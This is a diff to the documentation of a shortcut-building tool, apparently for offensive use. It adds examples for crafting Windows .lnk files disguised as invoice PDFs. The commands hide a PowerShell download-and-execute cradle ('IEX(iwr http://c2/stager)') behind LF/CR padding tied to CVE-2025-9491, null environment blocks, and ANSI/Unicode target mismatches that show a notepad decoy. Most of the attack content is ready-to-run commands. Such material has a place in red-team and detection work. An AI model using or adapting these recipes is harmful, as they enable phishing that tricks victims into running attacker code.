@@ -48,10 +48,23 @@ lnksmith build "C:\Windows\System32\cmd.exe" -o invoice.pdf.lnk \
 The Properties dialog will show ~300 spaces. The real command is hidden beyond
 the scroll boundary.
 
-`--pad-args` uses space (`0x20`) characters. The Windows Properties dialog
-also hides content after horizontal tab (`0x09`), line feed (`0x0A`), vertical
-tab (`0x0B`), form feed (`0x0C`), and carriage return (`0x0D`). For other
-whitespace characters, set the `arguments` field directly via `--from-json`.
+`--pad-args` uses space (`0x20`) by default. Use `--pad-char` to change the
+fill character. The Windows Properties dialog also hides content after
+horizontal tab (`0x09`), line feed (`0x0A`), vertical tab (`0x0B`), form feed
+(`0x0C`), and carriage return (`0x0D`).
+
+### LF/CR padding (CVE-2025-9491)
+
+LF+CR padding is harder to detect than spaces because the characters don't
+render visibly in the Properties dialog:
+
+```bash
+lnksmith build "C:\Windows\System32\cmd.exe" -o invoice.pdf.lnk \
+    --arguments "/c powershell -ep bypass -w hidden -c IEX(iwr http://c2/stager)" \
+    --pad-args 256 --pad-char '\n\r' \
+    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
+    --show minimized
+```
 
 ---
 
@@ -327,11 +340,15 @@ lnksmith build "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
 
 The `.lnk` format stores the target path in multiple redundant structures:
 `LinkTargetIDList`, `LinkInfo`, and `EnvironmentVariableDataBlock`. Windows
-prioritizes them differently. By setting `env_target_path` to a path that
-looks benign (or is syntactically invalid), the Properties dialog shows one
-path while the `LinkTargetIDList` executes another.
+prioritizes them differently for display vs execution, enabling several
+spoofing techniques documented by
+[Wietze Beukema](https://www.wietzebeukema.nl/blog/trust-me-im-a-shortcut).
 
-### Display notepad.exe, execute cmd.exe
+### Variant 0: Invalid path characters (display mismatch)
+
+Set `env_target_path` to a path containing invalid Windows characters
+(double quotes, RTL override). Explorer shows the env block value in the
+Properties dialog but falls back to `LinkTargetIDList` for execution.
 
 ```bash
 echo '{"env_target_path": "\"C:\\Windows\\notepad.exe\""}' > spoof.json
@@ -342,10 +359,45 @@ lnksmith build "C:\Windows\System32\cmd.exe" \
     -o spoofed.lnk
 ```
 
-The double quotes in `env_target_path` make it syntactically invalid as a
-Windows path, so Explorer falls back to the `LinkTargetIDList` (cmd.exe) for
-execution, but displays the `EnvironmentVariableDataBlock` path (notepad.exe)
-in the Properties dialog.
+### Variant 1: Null env block (disable target field)
+
+An all-zeros `EnvironmentVariableDataBlock` disables the target field in the
+Properties dialog (making it read-only) and hides command-line arguments,
+while the `LinkTargetIDList` target still executes normally.
+
+```bash
+lnksmith build "C:\Windows\System32\cmd.exe" \
+    --null-env-block \
+    --arguments "/c powershell -ep bypass -w hidden -c IEX(iwr http://c2/s)" \
+    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
+    --show minimized \
+    -o invoice.pdf.lnk
+```
+
+### Variant 4: ANSI/Unicode mismatch (most effective)
+
+The `EnvironmentVariableDataBlock` has separate ANSI and Unicode fields.
+When only the ANSI field is populated and `IsUnicode` is unset, Explorer
+displays the `LinkTargetIDList` path (the decoy) but executes via the ANSI
+env block path (the real target). This variant works immediately without
+requiring a repair cycle.
+
+The `target` argument becomes the **decoy** (what the user sees in the
+IDList). The `--env-target-ansi` value is the **real** executable.
+
+```bash
+lnksmith build "C:\Windows\notepad.exe" \
+    --env-target-ansi "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
+    --force-ansi \
+    --arguments "-ep bypass -w hidden -c IEX(iwr http://c2/stager)" \
+    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
+    --show minimized \
+    -o "Your-invoice.pdf.lnk"
+```
+
+The `--force-ansi` flag is required: it suppresses the `IsUnicode` flag and
+encodes `StringData` as cp1252, matching the behavior expected by Explorer
+for ANSI-only env block resolution.
 
 ---
 
